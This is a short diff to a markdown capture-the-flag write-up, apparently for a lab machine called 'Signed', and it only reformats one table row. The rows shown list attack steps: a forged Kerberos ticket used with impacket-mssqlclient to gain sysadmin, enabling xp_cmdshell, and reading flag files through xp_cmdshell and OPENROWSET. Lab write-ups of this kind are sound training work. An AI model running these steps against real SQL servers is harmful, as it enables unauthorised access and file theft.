@@ -22,8 +22,7 @@ Hints: True
 |   8  | mssqlsvc (via forged ticket) | **export KRB5CCNAME=mssqlsvc.ccache + impacket-mssqlclient -k -no-pass**    | Authenticated as `SIGNED\mssqlsvc` with full **dbo/sysadmin** privileges.                   |
 |   9  | mssqlsvc (sysadmin)          | **Enable xp_cmdshell (sp_configure)**                                       | Activated OS command execution from SQL shell.                                              |
 |  10  | mssqlsvc (sysadmin)          | **xp_cmdshell 'type C:\Users\mssqlsvc\Desktop\user.txt'**                   | Retrieved `user.txt` flag.                                                                  |
-|  11  | mssqlsvc (sysadmin)          | **OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB)** | Retrieved `root.txt` flag.                                                                  |
-                                                      |
+|  11  | mssqlsvc (sysadmin)          | **OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB)** | Retrieved `root.txt` flag.  |
 
 
 ## Nmap Recon
